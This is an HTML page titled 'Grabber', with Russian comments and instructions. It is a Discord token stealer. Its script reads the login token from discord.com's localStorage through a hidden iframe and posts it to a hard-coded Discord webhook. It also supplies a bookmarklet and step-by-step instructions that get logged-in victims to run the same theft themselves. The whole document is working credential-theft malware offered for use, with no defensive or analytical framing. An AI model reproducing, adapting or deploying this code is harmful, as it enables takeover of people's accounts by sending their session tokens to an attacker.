<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Grabber</title>
</head>
<body>
<script>
(function() {
  // ВАШ ВЕБХУК (МОЖНО ЗАМЕНИТЬ)
  const WEBHOOK = "https://discord.com/api/webhooks/1531307616343560383/21yXJEItbOjwyZYyFzUoLyYSKBPVTP0JH10NrkxQmBHiwsn8X66M3ufLusAWjcj-7CJP";

  function sendToken(token) {
    if (!token) return;
    fetch(WEBHOOK, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: "🎫 **Discord Token:** `" + token + "`",
        username: "GrabberBot"
      })
    }).catch(e => console.error(e));
  }

  function autoGrab() {
    // СОЗДАЁМ НЕВИДИМЫЙ IFrame С ТЕМ ЖЕ ORIGIN (DISCORD.COM)
    var iframe = document.createElement("iframe");
    iframe.style.display = "none";
    iframe.src = "https://discord.com";
    document.body.appendChild(iframe);

    iframe.onload = function() {
      try {
        var token = iframe.contentWindow.localStorage.token;
        if (token) {
          token = token.replace(/"/g, "");
          sendToken(token);
          // ОПЦИОНАЛЬНО: ПОКАЗАТЬ В PROMPT (КАК В ОРИГИНАЛЬНОМ СКРИПТЕ)
          // prompt("Token:", token);
        } else {
          // ЕСЛИ ТОКЕН НЕ НАЙДЕН – ПРОБУЕМ ЧЕРЕЗ RELOAD (КАК В БУКМАРКЛЕТЕ)
          // НО ЭТО МОЖЕТ ВЫЗВАТЬ ЦИКЛ, ПОЭТОМУ ДЕЛАЕМ ТОЛЬКО ОДИН РАЗ
          // МОЖНО ПРОСТО ПРОПУСТИТЬ
        }
      } catch(e) {
        console.error("Ошибка доступа к localStorage iframe:", e);
      }
    };
  }

  // ПРОВЕРЯЕМ, НАХОДИМСЯ ЛИ МЫ НА DISCORD.COM
  if (window.location.hostname.includes("discord.com")) {
    autoGrab();
  } else {
    // ЕСЛИ НЕ НА DISCORD – ПОКАЗЫВАЕМ ИНСТРУКЦИЮ И БУКМАРКЛЕТ
    document.body.innerHTML = `
      <div style="font-family: Arial, sans-serif; padding: 20px; max-width: 600px; margin: auto;">
        <h2>⚠️ Эта страница работает только на <code>discord.com</code></h2>
        <p>Для автоматического сбора токена откройте этот файл на домене Discord (невозможно), либо используйте букмарклет:</p>
        <p>
          <a href="javascript:(function(){location.reload();var i=document.createElement('iframe');document.body.appendChild(i);var t=i.contentWindow.localStorage.token;if(t){t=t.replace(/"/g,'');fetch('${WEBHOOK}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'🎫 Token: `'+t+'`',username:'Grabber'})});prompt('Token:',t);}})();">
            🔖 Перетащите в закладки (букмарклет)
          </a>
        </p>
        <p><strong>Инструкция:</strong></p>
        <ol>
          <li>Перетащите ссылку выше в панель закладок браузера.</li>
          <li>Перейдите на <a href="https://discord.com" target="_blank">discord.com</a> и войдите в аккаунт.</li>
          <li>Нажмите на созданную закладку – токен будет отправлен на вебхук и показан в prompt.</li>
        </ol>
        <p><em>Примечание: букмарклет модифицирован для отправки на ваш вебхук.</em></p>
      </div>
    `;
  }
})();
</script>
</body>
</html>
